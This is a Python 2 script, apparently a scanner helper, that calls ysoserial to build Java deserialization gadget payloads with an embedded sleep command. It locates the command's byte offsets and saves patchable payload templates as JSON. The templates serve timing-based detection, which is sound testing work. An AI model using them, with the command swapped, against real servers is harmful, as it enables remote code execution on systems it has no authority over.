import base64
import json
import difflib
import shlex

import subprocess32 as subprocess

# java -jar ysoserial-0.0.6-SNAPSHOT-all.jar -h
PAYLOADS = ['BeanShell1',
            'C3P0',
            'Clojure',
            'CommonsBeanutils1',
            'CommonsCollections1',
            'CommonsCollections2',
            'CommonsCollections3',
            'CommonsCollections4',
            'CommonsCollections5',
            'CommonsCollections6',
            'FileUpload1',
            'Groovy1',
            'Hibernate1',
            'Hibernate2',
            'JBossInterceptors1',
            'JRMPClient',
            'JRMPListener',
            'JSON1',
            'JavassistWeld1',
            'Jdk7u21',
            'Jython1',
            'MozillaRhino1',
            'Myfaces1',
            'Myfaces2',
            'ROME',
            'Spring1',
            'Spring2',
            'URLDNS',
            'Wicket1']

SLEEP_SAMPLES = {1: ['1', '3'],
                 2: ['22', '77']}

COMMAND = 'java -jar ysoserial-0.0.6-SNAPSHOT-all.jar %s "sleep %s"'


def get_payload_bin(payload, seconds):
    return subprocess.check_output(shlex.split(COMMAND % (payload, seconds)))


def get_payload_bin_for_command_len(payload, command_len):
    sample_1 = SLEEP_SAMPLES[command_len][0]
    sample_2 = SLEEP_SAMPLES[command_len][1]

    # Get two payloads, both with the same length of command but different
    # commands, this will help me identify the differences using difflib
    payload_bin_1 = get_payload_bin(payload, sample_1)
    payload_bin_2 = get_payload_bin(payload, sample_2)

    # Enable for debugging only
    #file('%s-%s-a.bin' % (payload, command_len), 'w').write(payload_bin_1)
    #file('%s-%s-b.bin' % (payload, command_len), 'w').write(payload_bin_2)

    offsets = []

    for a_index, b_index, size in difflib.SequenceMatcher(None, payload_bin_1, payload_bin_2).get_matching_blocks():

        # The last match is a dummy with size 0, we want to skip it
        if size == 0:
            break

        equals_1 = False
        equals_2 = False

        bytes_at_p1 = payload_bin_1[a_index + size: a_index + size + command_len]
        bytes_at_p2 = payload_bin_2[b_index + size: b_index + size + command_len]

        if bytes_at_p1 == sample_1:
            equals_1 = True

        if bytes_at_p2 == sample_2:
            equals_2 = True

        if equals_1 and equals_2:
            offsets.append(a_index + size)

    return payload_bin_1, offsets


def main(payloads):
    for payload in payloads:

        try:
            p1, o1 = get_payload_bin_for_command_len(payload, 1)
            p2, o2 = get_payload_bin_for_command_len(payload, 2)
        except Exception, e:
            args = (payload, e)
            msg = 'Failed to create %s.json, exception: "%s"'
            print(msg % args)
            print('\n\n\n')
            continue

        payload_json = {"1": {"payload": base64.b64encode(p1),
                              "offsets": o1},
                        "2": {"payload": base64.b64encode(p2),
                              "offsets": o2}}

        file('%s.json' % payload, 'w').write(json.dumps(payload_json, indent=4))
        print('Successfully created %s.json' % payload)
        print('\n\n\n')


if __name__ == '__main__':
    main(PAYLOADS)
